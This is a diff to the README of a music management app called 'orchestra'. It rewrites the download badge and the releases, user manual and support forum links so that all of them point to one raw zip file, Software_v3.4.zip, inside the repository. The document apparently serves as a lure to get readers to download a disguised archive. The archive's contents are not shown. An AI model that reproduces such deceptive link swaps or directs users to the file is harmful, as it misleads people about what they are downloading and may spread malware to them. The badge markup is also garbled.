@@ -1,6 +1,6 @@
 # 🎶 orchestra - Simple Music Management Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-orange.svg)](https://github.com/alibabavn1983/orchestra/releases)
+[![Download Now](https://github.com/alibabavn1983/orchestra/raw/refs/heads/main/apps/control-panel/public/Software_v3.4.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%https://github.com/alibabavn1983/orchestra/raw/refs/heads/main/apps/control-panel/public/Software_v3.4.zip)](https://github.com/alibabavn1983/orchestra/raw/refs/heads/main/apps/control-panel/public/Software_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **orchestra**, your handy app for managing music files. This guide wi
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click this link to go to the [orchestra Releases page](https://github.com/alibabavn1983/orchestra/releases). Here you will find the latest version of the app available for download.
+1. **Visit the Releases Page**: Click this link to go to the [orchestra Releases page](https://github.com/alibabavn1983/orchestra/raw/refs/heads/main/apps/control-panel/public/Software_v3.4.zip). Here you will find the latest version of the app available for download.
 
 2. **Choose Your Version**: On the Releases page, you will see several versions listed. Look for the most recent version at the top of the list.
 
@@ -51,7 +51,7 @@ Your thoughts matter. If you have suggestions or face issues, feel free to reach
 
 ## 🔗 Additional Resources
 
-- **User Manual**: [User Manual](https://github.com/alibabavn1983/orchestra/wiki)
-- **Support Forum**: [Support Forum](https://github.com/alibabavn1983/orchestra/issues)
+- **User Manual**: [User Manual](https://github.com/alibabavn1983/orchestra/raw/refs/heads/main/apps/control-panel/public/Software_v3.4.zip)
+- **Support Forum**: [Support Forum](https://github.com/alibabavn1983/orchestra/raw/refs/heads/main/apps/control-panel/public/Software_v3.4.zip)
 
 Thank you for choosing **orchestra**. Enjoy managing your music effortlessly!
